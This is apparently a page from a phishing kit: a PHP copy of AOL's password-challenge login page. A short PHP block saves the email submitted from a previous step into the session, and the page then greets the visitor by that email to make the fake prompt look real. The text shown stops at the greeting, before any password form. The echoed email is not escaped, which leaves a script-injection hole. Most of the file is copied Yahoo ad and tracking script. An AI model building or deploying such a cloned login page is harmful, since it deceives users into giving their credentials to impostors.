<?php 
session_start();
$_SESSION['email']=$_POST['email'];

?>
<!DOCTYPE html>
<html id="Stencil" class="js"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>AOL
</title>
        <link rel="dns-prefetch" href="https://gstatic.com/">
        <link rel="dns-prefetch" href="https://google.com/">
        <link rel="dns-prefetch" href="https://s.yimg.com/">
        <link rel="dns-prefetch" href="https://y.analytics.yahoo.com/">
        <link rel="dns-prefetch" href="https://ucs.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.query.yahoo.com/">
        <link rel="dns-prefetch" href="https://geo.yahoo.com/">
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="files/combo.css">
        <!--<![endif]-->
        <style nonce="/neNgHnB8eYiv3yX0vlrhaV2Yq+qDjVkzK9NgeaKrkxUDDZl">
            #mbr-css-check { 
                display: inline;
            }
        </style>
        <link href="files/aol-main.css" rel="stylesheet" type="text/css">
        <script nonce="/neNgHnB8eYiv3yX0vlrhaV2Yq+qDjVkzK9NgeaKrkxUDDZl">
            (function(root) {
                var isGoodJS = ('create' in Object && 'isArray' in Array && 'pushState' in window.history);
                root.isGoodJS = isGoodJS;
            }(this));
            
(function (root) {
/* -- Data -- */
root.YUI_config = {"comboBase":"https:\u002F\u002Fs.yimg.com\u002Fzz\u002Fcombo?","combine":true,"root":"yui-s:3.18.0\u002F"};
root.I13N_config = {"debug":false,"_ywa":10001496213979,"client_only":1,"spaceid":1197774520,"sections":null};
root.COMET_URL = "https:\u002F\u002Fpr.comet.yahoo.com\u002Fcomet";
root.I13N_config || (root.I13N_config = {});
root.I13N_config.spaceid = 150003036;
root.darlaConfig = {"url":"https:\u002F\u002Ffc.yahoo.com\u002Fsdarla\u002Fphp\u002Fclient.php?l=RICH{dest:tgtRICH;asz:flex}&f=150003036&ref=https%3A%2F%2Flogin.aol.com%2Faccount%2Fchallenge%2Fpassword","k2Rate":1,"positions":{"RICH":{"id":"RICH","clean":"login-ad-rich","dest":"login-ad-rich","w":1440,"h":1024,"timeout":3000,"noexp":1,"fdb":{"on":1,"where":"inside","minReqWidth":1325,"showAfter":2000}}}};
root.challenge || (root.challenge = {});
root.challenge.servingStamp = 1526508625243;
}(this));

            
            YUI_config.global = window;

            window.mbrSendError = function (name, url) {
                (new Image()).src = '/account/js-reporting/?rid=4skk9d9dfpb2h&crumb=' + encodeURIComponent('5mz7HaCf343') + '&message=' + encodeURIComponent(name.toLowerCase()) + '&url=' + encodeURIComponent(url);
            };

            var oldError = window.onerror;

            window.onerror = function (errorMsg, url) {
                window.mbrSendError(errorMsg, url);
                if (oldError) {
                    oldError.apply(this, arguments);
                }
                return false;
            };
        </script>
    <script type="text/x-safeframe-booted" id="sf_tag_1526508617980_81">{"positions":[{"id":"RICH","html":"<style>\n#adbridge_wrap.ad_300{\n    position:absolute;\n    margin:auto;\n    width:1440px;\n    height:1024px;\n    left:420px;\n}\n#adbridge_wrap.ad_1200{\n    position:absolute;\n    margin:auto;\n    width:1440px;\n    height:1024px;\n    left:50px;\n}\n.hide{\n    display:none;\n}\n<\/style>\n\n<div id=\"adbridge_wrap\" class=\"hide\">\n\n    <script type=\"text\/javascript\">\n        atwMN='963853171';\n        atwMultiSize='1';\n        atwSizes='300x600,1200x800,1440x1024';\n    <\/script>\n    <script type=\"text\/javascript\" src=\"https:\/\/o.aolcdn.com\/ads\/adsWrapper3.js\"><\/script>\n    \n<\/div>\n\n\n<script>\nvar interval = setInterval(function() {\n    if(document.readyState === 'complete') {\n        clearInterval(interval);\n        done();\n    }    \n}, 100);\n\nfunction done() {\n    var adBox = \"adbridge_wrap\";\n\n    removeClass(\"adbridge_wrap\",\"hide\");\n\n    var arrIframes = document.getElementsByTagName(\"iframe\");\n    for (i = 0; i < arrIframes.length; i++) {\n        if (arrIframes[i].style.width == 1440 || arrIframes[i].clientWidth == 1440){\n            return;\n        }       \n        if (arrIframes[i].style.width == 1200 || arrIframes[i].clientWidth == 1200){\n            addClass(adBox,\"ad_1200\");\n            return;\n        }\n        if (arrIframes[i].style.width == 300  || arrIframes[i].clientWidth == 300){\n            addClass(adBox,\"ad_300\");\n        }\n    }\n\n    var arrImgs = document.getElementsByTagName(\"img\");\n    for (i = 0; i < arrImgs.length; i++) {\n        if (arrImgs[i].style.width == 1440 || arrImgs[i].clientWidth == 1440){\n            return;\n        }       \n        if (arrImgs[i].style.width == 1200 || arrImgs[i].clientWidth == 1200){\n            addClass(adBox,\"ad_1200\");\n            return;\n        }\n        if (arrImgs[i].style.width == 300 || arrImgs[i].clientWidth == 300){\n            addClass(adBox,\"ad_300\");\n        }   \n    }\n}\nfunction addClass(id,className) {\n    byId(id).classList.add(className);\n}\nfunction byId(id) {\n    return document.getElementById(id);\n}\nfunction removeClass(id,className) {\n    byId(id).classList.remove(className);\n}            \n<\/script>\n<!\u2013\u2013 https:\/\/beap-bc.yahoo.com\/yc\/YnY9MS4wLjAmYnM9KDE3aHNjN2VwNyhnaWQkWWRMU1hERXdMakw0b1lZYld2eFNlQWRDTXpZdU9BQUFBQUQ4WjBrZCxzdCQxNTI2NTA4NjI2MDkyNTUwLHNpJDQ0NjU1NTEsc3AkMTUwMDAzMDM2LGN0JDI1LHlieCQ5S0EuOEtuaHRyUE14MzlaazQ2TGp3LGxuZyRlbi11cyxjciQ0ODQxNjYyMDUxLHYkMi4wLGFpZCRnQmxLSWdyUGhVay0sYmkkMjM0OTI1NDU1MSxtbWUkOTg4MDk4Njk0ODI0MjU5MDg0NixyJDAseW9vJDEsYWdwJDM1ODc5OTEwNTEsYXAkUklDSCkp\/0\/*\u2013\u2013><script>var url = \"\"; if(url && url.search(\"http\") != -1){document.write('<script src=\"' + url + '\"><\\\/script>');}<\/script><!--QYZ 2349254551,4841662051,;;RICH;150003036;1-->","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<script language=javascript>\nif(window.xzq_d==null)window.xzq_d=new Object();\nwindow.xzq_d['gBlKIgrPhUk-']='(as$13arnimu9,aid$gBlKIgrPhUk-,bi$2349254551,agp$3587991051,cr$4841662051,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)';\n<\/script><noscript><img width=1 height=1 alt=\"\" src=\"https:\/\/beap-bc.yahoo.com\/yi?bv=1.0.0&bs=(135ted7n0(gid$YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd,st$1526508626092550,si$4465551,sp$150003036,pv$1,v$2.0))&t=J_3-D_3&al=(as$13arnimu9,aid$gBlKIgrPhUk-,bi$2349254551,agp$3587991051,cr$4841662051,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)\"><\/noscript>","cscURI":"https:\/\/beap-bc.yahoo.com\/yi?bv=1.0.0&bs=(135ted7n0(gid$YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd,st$1526508626092550,si$4465551,sp$150003036,pv$1,v$2.0))&t=J_3-D_3&al=(as$13arnimu9,aid$gBlKIgrPhUk-,bi$2349254551,agp$3587991051,cr$4841662051,ct$25,at$H,eob$gd1_match_id=-1:ypos=RICH)","behavior":"non_exp","adID":"9880986948242590846","matchID":"999999.999999.999999.999999","bookID":"2349254551","slotID":"0","serveType":"-1","err":false,"hasExternal":false,"supp_ugc":"0","placementID":"3587991051","fdb":"{ \\\"fdb_url\\\": \\\"https:\\\\\\\/\\\\\\\/beap-bc.yahoo.com\\\\\\\/af\\\\\\\/sg3?bv=1.0.0&bs=(160edjpc9(gid$YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd,st$1526508626092550,srv$1,si$4465551,ct$25,exp$1526515826092550,adv$26513753608,li$3589080551,cr$4841662051,v$1.0,pbid$20459933223,seid$326510551))&al=(type${type},cmnt${cmnt},subo${subo})&r=10\\\", \\\"fdb_on\\\": \\\"1\\\", \\\"fdb_exp\\\": \\\"1526515826092\\\", \\\"fdb_intl\\\": \\\"en-US\\\" }","serveTime":"1526508626092550","impID":"gBlKIgrPhUk-","creativeID":4841662051,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":0,"facStatus":{},"userProvidedData":{},"facRotation":{},"slotData":{"pt":"3","bamt":"10000000000.000000","namt":"0.000000","isLiveAdPreview":"false","is_ad_feedback":"false","trusted_custom":"false","isCompAds":"false","adjf":"1.000000","alpha":"1.000000","ffrac":"1.000000","pcpm":"-1.000000","fc":"false","ecpm":0,"sdate":"1519945301","edate":"1567321199","bimpr":0,"pimpr":-84,"spltp":100,"frp":"false","pvid":"YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd"},"size":"1440x1024"}},"conf":{"w":1440,"h":1024}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-4-0\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/3-4-0\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-4-0\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/3-4-0\/html\/r-csc.html","root":"sdarla","edgeRoot":"http:\/\/l.yimg.com\/rq\/darla\/3-4-0","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-4-0","version":"3-4-0","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/3-4-0\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.","positions":{"RICH":{"dest":"tgtRICH","asz":"flex","id":"RICH","h":1024,"w":1440}},"property":"","events":[],"lang":"en-us","spaceID":"150003036","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-4-0\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-4-0\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-4-0\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-4-0\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"http:\\\/\\\/l.yimg.com\\\/rq\\\/darla\\\/3-4-0\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-4-0\",\"version\":\"3-4-0\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-4-0\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.\",\"positions\":{\"RICH\":{\"dest\":\"tgtRICH\",\"asz\":\"flex\",\"id\":\"RICH\",\"h\":1024,\"w\":1440}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"150003036\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<script language=javascript>\n(function(){window.xzq_p=function(R){M=R};window.xzq_svr=function(R){J=R};function F(S){var T=document;if(T.xzq_i==null){T.xzq_i=new Array();T.xzq_i.c=0}var R=T.xzq_i;R[++R.c]=new Image();R[R.c].src=S}window.xzq_sr=function(){var S=window;var Y=S.xzq_d;if(Y==null){return }if(J==null){return }var T=J+M;if(T.length>P){C();return }var X=\"\";var U=0;var W=Math.random();var V=(Y.hasOwnProperty!=null);var R;for(R in Y){if(typeof Y[R]==\"string\"){if(V&&!Y.hasOwnProperty(R)){continue}if(T.length+X.length+Y[R].length<=P){X+=Y[R]}else{if(T.length+Y[R].length>P){}else{U++;N(T,X,U,W);X=Y[R]}}}}if(U){U++}N(T,X,U,W);C()};function N(R,U,S,T){if(U.length>0){R+=\"&al=\"}F(R+U+\"&s=\"+S+\"&r=\"+T)}function C(){window.xzq_d=null;M=null;J=null}function K(R){xzq_sr()}function B(R){xzq_sr()}function L(U,V,W){if(W){var R=W.toString();var T=U;var Y=R.match(new RegExp(\"\\\\\\\\(([^\\\\\\\\)]*)\\\\\\\\)\"));Y=(Y[1].length>0?Y[1]:\"e\");T=T.replace(new RegExp(\"\\\\\\\\([^\\\\\\\\)]*\\\\\\\\)\",\"g\"),\"(\"+Y+\")\");if(R.indexOf(T)<0){var X=R.indexOf(\"{\");if(X>0){R=R.substring(X,R.length)}else{return W}R=R.replace(new RegExp(\"([^a-zA-Z0-9$_])this([^a-zA-Z0-9$_])\",\"g\"),\"$1xzq_this$2\");var Z=T+\";var rv = f( \"+Y+\",this);\";var S=\"{var a0 = '\"+Y+\"';var ofb = '\"+escape(R)+\"' ;var f = new Function( a0, 'xzq_this', unescape(ofb));\"+Z+\"return rv;}\";return new Function(Y,S)}else{return W}}return V}window.xzq_eh=function(){if(E||I){this.onload=L(\"xzq_onload(e)\",K,this.onload,0);if(E&&typeof (this.onbeforeunload)!=O){this.onbeforeunload=L(\"xzq_dobeforeunload(e)\",B,this.onbeforeunload,0)}}};window.xzq_s=function(){setTimeout(\"xzq_sr()\",1)};var J=null;var M=null;var Q=navigator.appName;var H=navigator.appVersion;var G=navigator.userAgent;var A=parseInt(H);var D=Q.indexOf(\"Microsoft\");var E=D!=-1&&A>=4;var I=(Q.indexOf(\"Netscape\")!=-1||Q.indexOf(\"Opera\")!=-1)&&A>=4;var O=\"undefined\";var P=2000})();\n<\/script><script language=javascript>\nif(window.xzq_svr)xzq_svr('https:\/\/beap-bc.yahoo.com\/');\nif(window.xzq_p)xzq_p('yi?bv=1.0.0&bs=(135ted7n0(gid$YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd,st$1526508626092550,si$4465551,sp$150003036,pv$1,v$2.0))&t=J_3-D_3');\nif(window.xzq_s)xzq_s();\n<\/script><noscript><img width=1 height=1 alt=\"\" src=\"https:\/\/beap-bc.yahoo.com\/yi?bv=1.0.0&bs=(135ted7n0(gid$YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd,st$1526508626092550,si$4465551,sp$150003036,pv$1,v$2.0))&t=J_3-D_3\"><\/noscript><script>(function(c){var d=\"https:\/\/\",a=c&&c.JSON,e=\"ypcdb\",g=document,b;function j(n,q,p,o){var m,r;try{m=new Date();m.setTime(m.getTime()+o*1000);g.cookie=[n,\"=\",encodeURIComponent(q),\"; domain=\",p,\"; path=\/; max-age=\",o,\"; expires=\",m.toUTCString()].join(\"\")}catch(r){}}function k(m){return function(){i(m)}}function i(n){var m,o;try{m=new Image();m.onerror=m.onload=function(){m.onerror=m.onload=null;m=null};m.src=n}catch(o){}}function f(o){var p=\"\",n,s,r,q;if(o){try{n=o.match(\/^https?:\\\/\\\/([^\\\/\\?]*)(yahoo\\.com|yimg\\.com|flickr\\.com|yahoo\\.net|rivals\\.com)(:\\d+)?([\\\/\\?]|$)\/);if(n&&n[2]){p=n[2]}n=(n&&n[1])||null;s=n?n.length-1:-1;r=n&&s>=0?n[s]:null;if(r&&r!=\".\"&&r!=\"\/\"){p=\"\"}}catch(q){p=\"\"}}return p}function l(B,n,q,m,p){var u,s,t,A,r,F,z,E,C,y,o,D,x,v=1000,w=v;try{b=location}catch(z){b=null}try{if(a){C=a.parse(p)}else{y=new Function(\"return \"+p);C=y()}}catch(z){C=null}if(y){y=null}try{s=b.hostname;t=b.protocol;if(t){t+=\"\/\/\"}}catch(z){s=t=\"\"}if(!s){try{A=g.URL||b.href||\"\";r=A.match(\/^((http[s]?)\\:[\\\/]+)?([^:\\\/\\s]+|[\\:\\dabcdef\\.]+)\/i);if(r&&r[1]&&r[3]){t=r[1]||\"\";s=r[3]||\"\"}}catch(z){t=s=\"\"}}if(!s||!C||!t||!q){return}A=g.URL||b.href||\"\";E=f(A);if(!E||g.cookie.indexOf(\"ypcdb=\"+n)>-1){return}if(t===d){q=m}u=0;while(F=q[u++]){o=F.lastIndexOf(\"=\");if(o!=-1){D=F.substr(1+o);x=C[D];if(x){setTimeout(k(t+F+x),w);w+=v}}}u=0;while(F=B[u++]){setTimeout(k(t+F),w);w+=v}setTimeout(function(){j(e,n,E,86400)},w)}function h(){l(['ads.yahoo.com\/get-user-id?ver=2&s=800000001&type=redirect&ts=1526508626&sig=dae69f81cb0bfe5a','ads.yahoo.com\/get-user-id?ver=2&s=800000008&type=redirect&ts=1526508626&sig=031e2e6e9d9fb2cf'],'deba5cabd35808fd45418ae547d899eb',['csync.flickr.com\/csync?ver=2.1','csync.yahooapis.com\/csync?ver=2.1'],['csync.flickr.com\/csync?ver=2.1','csync.yahooapis.com\/csync?ver=2.1'],'{\"2.1\":\"&id=23351&value=su8p63qqsbxwb%26o%3d3%26f%3d7n&optout=&timeout=1526508626&sig=11gj5du9h\"}')}if(c.addEventListener){c.addEventListener(\"load\",h,false)}else{if(c.attachEvent){c.attachEvent(\"onload\",h)}else{c.onload=h}}})(window);\n<\/script><script>(function(d){var a=d.body.appendChild(d.createElement('iframe')),b=a.contentWindow.document;a.style.cssText='height:0;width:0;frameborder:no;scrolling:no;sandbox:allow-scripts;display:none;';b.open().write('<body onload=\"var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'https:\\\/\\\/s.yimg.com\\\/rq\\\/sbox\\\/bv.js\\'\">');b.close();})(document);<\/script>","pos_list":["RICH"],"transID":"darla_prefetch_1526508626090_475874183_3","k2_uri":"","fac_rt":"20029","spaceID":"150003036","lookupTime":24,"procTime":25,"npv":0,"pvid":"YdLSXDEwLjL4oYYbWvxSeAdCMzYuOAAAAAD8Z0kd","serveTime":"1526508626092550","ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/login.aol.com\/account\/challenge\/password","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1526508626090_2080514026_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":"CWZ1bmN0aW9uIGRwZWQoKSB7IGlmKHdpbmRvdy54enFfZD09bnVsbCl3aW5kb3cueHpxX2Q9bmV3IE9iamVjdCgpOwp3aW5kb3cueHpxX2RbJ2dCbEtJZ3JQaFVrLSddPScoYXMkMTNhcm5pbXU5LGFpZCRnQmxLSWdyUGhVay0sYmkkMjM0OTI1NDU1MSxhZ3AkMzU4Nzk5MTA1MSxjciQ0ODQxNjYyMDUxLGN0JDI1LGF0JEgsZW9iJGdkMV9tYXRjaF9pZD0tMTp5cG9zPVJJQ0gpJzsKCQkgfTsKZHBlZC50cmFuc0lEID0gImRhcmxhX3ByZWZldGNoXzE1MjY1MDg2MjYwOTBfNDc1ODc0MTgzXzMiOwoKCWZ1bmN0aW9uIGRwZXIoKSB7IAoJCmlmKHdpbmRvdy54enFfc3ZyKXh6cV9zdnIoJ2h0dHBzOi8vYmVhcC1iYy55YWhvby5jb20vJyk7CmlmKHdpbmRvdy54enFfcCl4enFfcCgneWk\/YnY9MS4wLjAmYnM9KDEzNXRlZDduMChnaWQkWWRMU1hERXdMakw0b1lZYld2eFNlQWRDTXpZdU9BQUFBQUQ4WjBrZCxzdCQxNTI2NTA4NjI2MDkyNTUwLHNpJDQ0NjU1NTEsc3AkMTUwMDAzMDM2LHB2JDEsdiQyLjApKSZ0PUpfMy1EXzMnKTsKaWYod2luZG93Lnh6cV9zKXh6cV9zKCk7CgoKCShmdW5jdGlvbihjKXt2YXIgZD0iaHR0cHM6Ly8iLGE9YyYmYy5KU09OLGU9InlwY2RiIixnPWRvY3VtZW50LGI7ZnVuY3Rpb24gaihuLHEscCxvKXt2YXIgbSxyO3RyeXttPW5ldyBEYXRlKCk7bS5zZXRUaW1lKG0uZ2V0VGltZSgpK28qMTAwMCk7Zy5jb29raWU9W24sIj0iLGVuY29kZVVSSUNvbXBvbmVudChxKSwiOyBkb21haW49IixwLCI7IHBhdGg9LzsgbWF4LWFnZT0iLG8sIjsgZXhwaXJlcz0iLG0udG9VVENTdHJpbmcoKV0uam9pbigiIil9Y2F0Y2gocil7fX1mdW5jdGlvbiBrKG0pe3JldHVybiBmdW5jdGlvbigpe2kobSl9fWZ1bmN0aW9uIGkobil7dmFyIG0sbzt0cnl7bT1uZXcgSW1hZ2UoKTttLm9uZXJyb3I9bS5vbmxvYWQ9ZnVuY3Rpb24oKXttLm9uZXJyb3I9bS5vbmxvYWQ9bnVsbDttPW51bGx9O20uc3JjPW59Y2F0Y2gobyl7fX1mdW5jdGlvbiBmKG8pe3ZhciBwPSIiLG4scyxyLHE7aWYobyl7dHJ5e249by5tYXRjaCgvXmh0dHBzPzpcL1wvKFteXC9cP10qKSh5YWhvb1wuY29tfHlpbWdcLmNvbXxmbGlja3JcLmNvbXx5YWhvb1wubmV0fHJpdmFsc1wuY29tKSg6XGQrKT8oW1wvXD9dfCQpLyk7aWYobiYmblsyXSl7cD1uWzJdfW49KG4mJm5bMV0pfHxudWxsO3M9bj9uLmxlbmd0aC0xOi0xO3I9biYmcz49MD9uW3NdOm51bGw7aWYociYmciE9Ii4iJiZyIT0iLyIpe3A9IiJ9fWNhdGNoKHEpe3A9IiJ9fXJldHVybiBwfWZ1bmN0aW9uIGwoQixuLHEsbSxwKXt2YXIgdSxzLHQsQSxyLEYseixFLEMseSxvLEQseCx2PTEwMDAsdz12O3RyeXtiPWxvY2F0aW9ufWNhdGNoKHope2I9bnVsbH10cnl7aWYoYSl7Qz1hLnBhcnNlKHApfWVsc2V7eT1uZXcgRnVuY3Rpb24oInJldHVybiAiK3ApO0M9eSgpfX1jYXRjaCh6KXtDPW51bGx9aWYoeSl7eT1udWxsfXRyeXtzPWIuaG9zdG5hbWU7dD1iLnByb3RvY29sO2lmKHQpe3QrPSIvLyJ9fWNhdGNoKHope3M9dD0iIn1pZighcyl7dHJ5e0E9Zy5VUkx8fGIuaHJlZnx8IiI7cj1BLm1hdGNoKC9eKChodHRwW3NdPylcOltcL10rKT8oW146XC9cc10rfFtcOlxkYWJjZGVmXC5dKykvaSk7aWYociYmclsxXSYmclszXSl7dD1yWzFdfHwiIjtzPXJbM118fCIifX1jYXRjaCh6KXt0PXM9IiJ9fWlmKCFzfHwhQ3x8IXR8fCFxKXtyZXR1cm59QT1nLlVSTHx8Yi5ocmVmfHwiIjtFPWYoQSk7aWYoIUV8fGcuY29va2llLmluZGV4T2YoInlwY2RiPSIrbik+LTEpe3JldHVybn1pZih0PT09ZCl7cT1tfXU9MDt3aGlsZShGPXFbdSsrXSl7bz1GLmxhc3RJbmRleE9mKCI9Iik7aWYobyE9LTEpe0Q9Ri5zdWJzdHIoMStvKTt4PUNbRF07aWYoeCl7c2V0VGltZW91dChrKHQrRit4KSx3KTt3Kz12fX19dT0wO3doaWxlKEY9Qlt1KytdKXtzZXRUaW1lb3V0KGsodCtGKSx3KTt3Kz12fXNldFRpbWVvdXQoZnVuY3Rpb24oKXtqKGUsbixFLDg2NDAwKX0sdyl9ZnVuY3Rpb24gaCgpe2woWydhZHMueWFob28uY29tL2dldC11c2VyLWlkP3Zlcj0yJnM9ODAwMDAwMDAxJnR5cGU9cmVkaXJlY3QmdHM9MTUyNjUwODYyNiZzaWc9ZGFlNjlmODFjYjBiZmU1YScsJ2Fkcy55YWhvby5jb20vZ2V0LXVzZXItaWQ\/dmVyPTImcz04MDAwMDAwMDgmdHlwZT1yZWRpcmVjdCZ0cz0xNTI2NTA4NjI2JnNpZz0wMzFlMmU2ZTlkOWZiMmNmJ10sJ2RlYmE1Y2FiZDM1ODA4ZmQ0NTQxOGFlNTQ3ZDg5OWViJyxbJ2NzeW5jLmZsaWNrci5jb20vY3N5bmM\/dmVyPTIuMScsJ2NzeW5jLnlhaG9vYXBpcy5jb20vY3N5bmM\/dmVyPTIuMSddLFsnY3N5bmMuZmxpY2tyLmNvbS9jc3luYz92ZXI9Mi4xJywnY3N5bmMueWFob29hcGlzLmNvbS9jc3luYz92ZXI9Mi4xJ10sJ3siMi4xIjoiJmlkPTIzMzUxJnZhbHVlPXN1OHA2M3Fxc2J4d2IlMjZvJTNkMyUyNmYlM2Q3biZvcHRvdXQ9JnRpbWVvdXQ9MTUyNjUwODYyNiZzaWc9MTFnajVkdTloIn0nKX1pZihjLmFkZEV2ZW50TGlzdGVuZXIpe2MuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsaCxmYWxzZSl9ZWxzZXtpZihjLmF0dGFjaEV2ZW50KXtjLmF0dGFjaEV2ZW50KCJvbmxvYWQiLGgpfWVsc2V7Yy5vbmxvYWQ9aH19fSkod2luZG93KTsKCgoJKGZ1bmN0aW9uKGQpe3ZhciBhPWQuYm9keS5hcHBlbmRDaGlsZChkLmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpKSxiPWEuY29udGVudFdpbmRvdy5kb2N1bWVudDthLnN0eWxlLmNzc1RleHQ9J2hlaWdodDowO3dpZHRoOjA7ZnJhbWVib3JkZXI6bm87c2Nyb2xsaW5nOm5vO3NhbmRib3g6YWxsb3ctc2NyaXB0cztkaXNwbGF5Om5vbmU7JztiLm9wZW4oKS53cml0ZSgnPGJvZHkgb25sb2FkPSJ2YXIgZD1kb2N1bWVudDtkLmdldEVsZW1lbnRzQnlUYWdOYW1lKFwnaGVhZFwnKVswXS5hcHBlbmRDaGlsZChkLmNyZWF0ZUVsZW1lbnQoXCdzY3JpcHRcJykpLnNyYz1cJ2h0dHBzOlwvXC9zLnlpbWcuY29tXC9ycVwvc2JveFwvYnYuanNcJyI+Jyk7Yi5jbG9zZSgpO30pKGRvY3VtZW50KTsKCgkKIH07CmRwZXIudHJhbnNJRCA9ImRhcmxhX3ByZWZldGNoXzE1MjY1MDg2MjYwOTBfNDc1ODc0MTgzXzMiOwoK"}}}</script><script type="text/javascript" src="files/boot.js"></script><script id="sf_host_lib_sf_auto_4-17-4-2018" type="text/javascript" class="sf_lib" src="files/g-r-min.js"></script></head>
    <body>
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input id="mbr-legacy-device-bar-cross" type="checkbox">
            <p class="mbr-legacy-device">
                AOL works best with the latest versions of the browsers.
 You're using an outdated or unsupported browser and some AOL features 
may not work properly. Please update your browser version now. <a href="https://help.yahoo.com/kb/index?page=content&amp;y=PROD_ACCT&amp;id=SLN4556&amp;actp=productlink&amp;locale=en_US">More&nbsp;Info</a>
            </p>
        </div>
    <script nonce="/neNgHnB8eYiv3yX0vlrhaV2Yq+qDjVkzK9NgeaKrkxUDDZl">
        (function(root) {
            var doc = document;

            if (root.isGoodJS) {
                doc.documentElement.className = doc.documentElement.className.replace('no-js', 'js');
                doc.cookie = 'mbr-nojs=; domain=' + doc.domain + '; path=/account; expires=Thu, 01 Jan 1970 00:00:01 GMT; secure';
            } else {
                doc.cookie = 'mbr-nojs=badbrowser; domain=' + doc.domain + '; path=/account; expires=Fri, 31 Dec 9999 23:59:59 GMT; secure';
                doc.getElementById('mbr-legacy-device-bar').style.display = 'block';
            }
        }(this));
    </script>

    <div id="login-body" class="loginish  puree-v2 responsive">
    <div class="mbr-desktop-hd pure-g">
    <div class="pure-u-4-5">
         <a href="https://www.aol.com/">
            <img src="files/aol-logo-black-v.png" alt="Aol" class="logo " width="100" height="">
        </a>
    </div>
    <div class="pure-u-1-5 txt-align-right">
        <div class="help"><a href="https://help.aol.com/">Help</a></div>
    </div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="files/aol-logo-black-v.png" alt="Aol" class="logo " width="100" height="">
            </div>
            <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello&nbsp;<?php echo $_SESSION['email'];?></h1>
